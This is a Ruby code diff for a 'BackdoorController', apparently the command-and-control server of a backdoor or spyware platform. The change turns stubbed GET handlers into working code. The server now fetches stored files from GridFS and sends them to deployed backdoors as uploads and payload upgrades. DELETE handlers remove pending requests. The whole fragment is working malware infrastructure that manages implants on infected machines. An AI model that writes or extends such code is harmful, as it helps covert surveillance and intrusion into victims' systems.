@@ -95,10 +95,11 @@ class BackdoorController < RESTController
 
     case @req_method
       when 'GET'
-        #TODO: get from grid
-        upload = {:content => 'TODO: get from grid'}
-        trace :info, "[#{@req_peer}] Requested the UPLOAD #{request} -- #{upload[:content].size.to_s_bytes}"
-        return STATUS_OK, upload[:content], "binary/octet-stream"
+        backdoor = Item.where({_kind: 'backdoor', _id: request['backdoor_id']}).first
+        upload = backdoor.upload_requests.find(conditions: { _id: request['upload_id']}).first
+        content = GridFS.instance.get upload[:_grid]
+        trace :info, "[#{@req_peer}] Requested the UPLOAD #{request} -- #{content.file_length.to_s_bytes}"
+        return STATUS_OK, content.read, content.content_type
       when 'DELETE'
         backdoor = Item.where({_kind: 'backdoor', _id: request['backdoor_id']}).first
         backdoor.upload_requests.destroy_all(conditions: { _id: request['upload_id']})
@@ -126,16 +127,17 @@ class BackdoorController < RESTController
 
     case @req_method
       when 'GET'
-        #TODO: get from grid
-        upgrade = {:content => 'TODO: get from grid'}
-        trace :info, "[#{@req_peer}] Requested the UPGRADE #{request} -- #{upgrade[:content].size.to_s_bytes}"
-        return STATUS_OK, upgrade[:content], "binary/octet-stream"
+        backdoor = Item.where({_kind: 'backdoor', _id: request['backdoor_id']}).first
+        upgrade = backdoor.upgrade_requests.find(conditions: { _id: request['upgrade_id']}).first
+        content = GridFS.instance.get upgrade[:_grid]
+        trace :info, "[#{@req_peer}] Requested the UPGRADE #{request} -- #{content.file_length.to_s_bytes}"
+        return STATUS_OK, content.read, content.content_type
       when 'DELETE'
         backdoor = Item.where({_kind: 'backdoor', _id: request['backdoor_id']}).first
         backdoor.upgrade_requests.destroy_all
         trace :info, "[#{@req_peer}] Deleted the UPGRADE #{request}"
     end
-
+    
     return STATUS_OK
   end
 
